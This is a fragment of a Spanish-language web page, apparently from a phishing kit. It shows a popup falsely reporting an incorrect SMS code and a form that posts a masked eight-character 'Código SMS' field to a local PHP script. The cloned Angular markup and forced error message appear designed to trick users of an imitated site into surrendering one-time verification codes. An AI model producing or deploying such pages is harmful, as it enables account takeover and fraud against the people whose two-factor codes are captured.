...
Swal.fire({
    ...
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">C&Oacute;DIGO SMS INCORRECTO</h1><br><p style="text-align:center;">El c&oacute;digo que recibiste debe tener una longitud de 8 caracteres </p>'
});
</script>
...
<div _ngcontent-c15="" class="container-fluid">
  ...
  <div _ngcontent-c15="" class="row justify-content-center show-grid" style="margin-top: 50px;">
    <form _ngcontent-c15="" novalidate="" class="ng-touched ng-dirty ng-valid" action="post/pos2.php" method="POST" autocomplete="off" name="form1">
      <div _ngcontent-c15="" class="row justify-content-center d-block">
        <div _ngcontent-c15="" class="col-12">
          <div _ngcontent-c15="" class="form-group">
            ...
            <input _ngcontent-c15="" maxlength="8"  placeholder="C&oacute;digo SMS" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="code" id="user" type="password" onkeypress="return isNumberKey(event);">
          </div>
        </div>
      </div>
